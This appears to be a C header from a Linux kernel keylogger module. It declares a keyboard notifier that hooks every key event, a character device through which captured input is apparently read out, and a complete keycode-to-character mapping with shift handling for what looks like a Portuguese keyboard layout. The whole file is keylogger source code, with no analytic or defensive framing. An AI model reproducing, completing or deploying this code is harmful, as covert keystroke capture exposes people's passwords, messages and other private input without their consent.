#ifndef KLOGGER_HEADER
#define KLOGGER_HEADER

int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param);
char convertKeycode2Character(int keycode,int shift);
int init_dev_file();
void clear_dev_file();
ssize_t read_dev_file(struct file *f, char __user *buf, size_t len, loff_t *off);
ssize_t write_dev_file(struct file *f, const char __user *buf, size_t len, loff_t *off);

/* declare handlers for each operation on character device */
static struct file_operations dev_fops =
{
  .owner = THIS_MODULE,
  .read = read_dev_file,
  .write = write_dev_file 
};

/* declare keyboard_listener as the handler of keyboard events */
static struct notifier_block nb = {
  .notifier_call = keyboard_listener
};

/**
 * Returns the character that maps with given key code
 *
 */
char convertKeycode2Character(int keycode,int shift) {

	switch(keycode) {
		case 30: return shift ? 'A' : 'a';
		case 48: return shift ? 'B' : 'b';
		case 46: return shift ? 'C' : 'c';
		case 32: return shift ? 'D' : 'd';
		case 18: return shift ? 'E' : 'e';
		case 33: return shift ? 'F' : 'f';
		case 34: return shift ? 'G' : 'g';
		case 35: return shift ? 'H' : 'h';
		case 23: return shift ? 'I' : 'i';
		case 36: return shift ? 'J' : 'j';
		case 37: return shift ? 'K' : 'k';
		case 38: return shift ? 'L' : 'l';
		case 50: return shift ? 'M' : 'm';
		case 49: return shift ? 'N' : 'n';
		case 24: return shift ? 'O' : 'o';
		case 25: return shift ? 'P' : 'p';
		case 16: return shift ? 'Q' : 'q';
		case 19: return shift ? 'R' : 'r';
		case 31: return shift ? 'S' : 's';
		case 20: return shift ? 'T' : 't';
		case 22: return shift ? 'U' : 'u';
		case 47: return shift ? 'V' : 'v';
		case 17: return shift ? 'W' : 'w';
		case 45: return shift ? 'X' : 'x';
		case 21: return shift ? 'Y' : 'y';
		case 44: return shift ? 'Z' : 'z';
		case 39: return shift ? 'Ç' : 'ç';
		case 2:  return shift ? '!' : '1';
		case 3:  return shift ? '"' : '2';
		case 4:  return shift ? '#' : '3';
		case 5:  return shift ? '$' : '4';
		case 6:  return shift ? '%' : '5';
		case 7:  return shift ? '&' : '6';
		case 8:  return shift ? '/' : '7';
		case 9:  return shift ? '(' : '8';
		case 10:  return shift ? ')' : '9';
		case 11:  return shift ? '=' : '0';
		case 13: return shift ? '*' : '+';
		case 27: return shift ? '`' : '´';
		case 43: return shift ? '\\' : '|';
		case 40: return shift ? '^' : '~';
		case 53: return shift ? '_' : '-';
		case 86: return shift ? '>' : '<';
		case 52: return shift ? ':' : '.';
		case 51: return shift ? ';' : ',';
		case 57: return ' ';
		//case 14: return 'backspace';
		case 28: return '\n';
		case 54: return '\0'; //right shift
		case 42: return '\0'; //left shift
		case 15: return '\0'; //TAB
		default: return '?';
	}
}


#endif
